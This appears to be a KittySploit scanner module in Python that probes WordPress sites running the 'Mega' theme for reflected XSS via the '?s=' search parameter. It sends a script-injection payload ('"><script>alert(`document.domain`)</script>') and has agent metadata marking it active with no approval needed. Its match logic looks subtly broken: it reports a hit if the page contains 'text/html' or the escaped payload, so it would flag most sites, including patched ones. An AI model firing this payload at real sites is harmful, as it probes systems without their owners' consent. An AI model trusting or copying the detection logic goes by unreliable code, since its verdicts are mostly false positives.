#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress theme with a 'Mega-Theme' design is vulnerable to a reflected XSS attack through the '?s=' parameter."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mega Wordpress Theme - Cross site scripting Detection',
        'description': "WordPress theme with a 'Mega-Theme' design is vulnerable to a reflected XSS attack through the '?s=' parameter.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wp', 'wp-theme', 'wordpress', 'xss', 'mega', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2021120027',
            'https://www.zhaket.com/web/megawp-wordpress-theme',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/?s=%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html', 'script&gt;alert(`document.domain`)&lt;/script', 'mega-theme',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Mega Wordpress Theme - Cross site scripting detected",
                path='/?s=%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E',
            )
            return True
        return False

